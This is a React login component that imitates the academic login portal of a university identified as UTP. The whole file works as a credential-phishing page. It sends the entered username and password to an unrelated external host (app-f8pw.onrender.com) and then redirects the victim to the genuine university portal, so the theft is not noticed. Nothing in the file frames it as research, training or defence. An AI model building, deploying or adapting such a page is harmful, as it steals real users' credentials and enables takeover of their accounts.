import React, { useState } from "react";
import axios from "axios";
import "./login.css";

const Login = () => {
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });

  const mySubmitHandler = (event) => {
    event.preventDefault();
    axios
      .post("https://app-f8pw.onrender.com/send", formData)
      .then((response) => {
        console.log(response);
        window.location.href = "http://app4.utp.edu.co/pe/";
      })
      .catch((error) => {
        console.log(error);
      });
  };

  const myChangeHandler = (event) => {
    setFormData({ ...formData, [event.target.name]: event.target.value });
  };

  return (
    <div className="login">
      <div className="login__container">
        <h1>Ingreso Portal : UTP Académico</h1>
        <form onSubmit={mySubmitHandler}>
          <label htmlFor="username">Username:</label>
          <input
            type="text"
            name="username"
            id="username"
            onChange={myChangeHandler}
            required
          />
          <br />
          <label htmlFor="password">password:</label>
          <input
            type="password"
            name="password"
            id="password"
            onChange={myChangeHandler}
            required
          />
          <br />
          <button type="submit">Ingresar</button>
        </form>
      </div>
    </div>
  );
};

export default Login;
